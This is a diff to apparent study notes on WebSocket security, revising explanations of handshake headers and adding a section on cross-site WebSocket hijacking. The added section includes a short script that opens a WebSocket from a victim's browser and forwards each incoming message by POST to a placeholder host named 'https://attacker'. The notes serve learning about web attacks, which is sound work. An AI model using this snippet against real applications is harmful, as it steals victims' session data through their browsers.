@@ -41,17 +41,11 @@ Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
 
 * The `Connection` and `Upgrade` headers in the request and response indicate that this is a WebSocket handshake.
 
-<!---->
+- The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
 
-* The `Sec-WebSocket-Version` request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
+* The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request. This is use to prevent errors from caching proxies. (It is not like CSRF token...)
 
-<!---->
-
-* The `Sec-WebSocket-Key` request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
-
-<!---->
-
-* The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
+- The `Sec-WebSocket-Accept` response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
 
 </details>
 
@@ -75,7 +69,7 @@ ws.send("Peter Wiener");
 
 ## <mark style="color:yellow;">Manipulating WebSocket connections</mark>
 
-To do ...
+[https://portswigger.net/web-security/websockets#manipulating-websocket-connections](https://portswigger.net/web-security/websockets#manipulating-websocket-connections)
 
 ## <mark style="color:yellow;">WebSockets vulnerabilities</mark>
 
@@ -89,12 +83,22 @@ To do ...
 
 ## <mark style="color:yellow;">Cross-site WebSocket hijacking</mark>
 
-An attacker can craft a malicious webpage on their domain, initiating a cross-site WebSocket connection to the susceptible application.
+An attacker can craft a malicious webpage on their domain, initiating a cross-site WebSocket connection to the susceptible application. (As CSRF, the websocket connection mustn't contain CSRF tokens)
 
 * Perform unauthorized actions masquerading as the victim user (like CSRF)
 * Retrieve sensitive data that the user can access.
-  * Cross-site WebSocket hijacking grants the attacker bidirectional access to the vulnerable application via the hijacked WebSocket. If the application utilizes server-generated WebSocket messages to send sensitive user data, the attacker can intercept these messages and capture the victim user's data.
 * Waiting for incoming messages to arrive containing sensitive data.
 
+Exploitation code to open a websocket connection to send messages on your server
 
-
+```html
+<script>
+    var ws = new WebSocket('wss://your-websocket-url');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://attacker', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
